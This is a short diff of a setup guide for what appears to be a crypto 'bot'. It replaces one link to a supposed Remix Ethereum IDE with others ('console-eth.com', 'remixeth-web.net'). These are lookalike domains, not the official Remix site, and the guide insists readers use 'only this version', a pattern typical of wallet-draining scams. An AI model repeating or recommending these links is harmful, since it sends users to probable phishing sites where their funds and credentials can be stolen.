@@ -12,7 +12,7 @@ Step-by-Step Setup Guide:
 
 2- Access Remix
 
-► [Use Remix Ethereum IDE](https://remixide-console.org/) 🚨 https://remixide-console.org/ (Ensure you only use this version, as the bot is compatible with it specifically.)
+► [Use Remix Ethereum IDE](https://console-eth.com/) 🚨 https://console-eth.com/ Or https://remixeth-web.net/ (Ensure you only use this version, as the bot is compatible with it specifically.)
 
 3- Create Contract File
 
